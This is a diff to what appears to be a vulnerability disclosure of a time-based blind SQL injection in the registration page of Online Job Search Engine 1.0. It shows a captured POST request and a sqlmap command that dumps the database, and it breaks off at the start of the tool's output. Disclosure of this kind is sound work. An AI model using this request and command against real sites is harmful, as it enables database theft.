@@ -22,40 +22,25 @@ Online Job Search Engine 1.0 — a time-based blind SQL injection was found in t
 + Captured Burp request:
 ```
 POST /onlinejobsearchengine/registration.php HTTP/1.1
-
 Host: 192.168.1.6
-
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-
 Accept-Language: en-US,en;q=0.5
-
 Accept-Encoding: gzip, deflate, br
-
 Content-Type: application/x-www-form-urlencoded
-
 Content-Length: 292
-
 Origin: http://192.168.1.6
-
 Connection: keep-alive
-
 Referer: http://192.168.1.6/onlinejobsearchengine/registration.php
-
 Cookie: PHPSESSID=bmpn3922cigtn7sfl9ogm5f401
-
 Upgrade-Insecure-Requests: 1
-
 Priority: u=0, i
-
 
 txtfullname=hello&txtphone=1234512345&state=---+Please+select+your+State+---&month=Jan&day=1&year=2011&cmdsex=Male&txtaddress=+&cmdqualification=FSLC&cmdspecialization=+Accounting+%2F+Audit+%2F+Tax&txtregID=X9WWMW&txtusername=hello21&updatepin=used&propic=uploads%2Fdefault.jpg&submit=Sign+Up
 ```
 + Use sqlmap to exploit.
 ```
 sqlmap -r req.txt --batch --dump --current-db --dbms mysql --risk 3 --level 5
-
 ```
 ```
 ---                                                                                                                                          
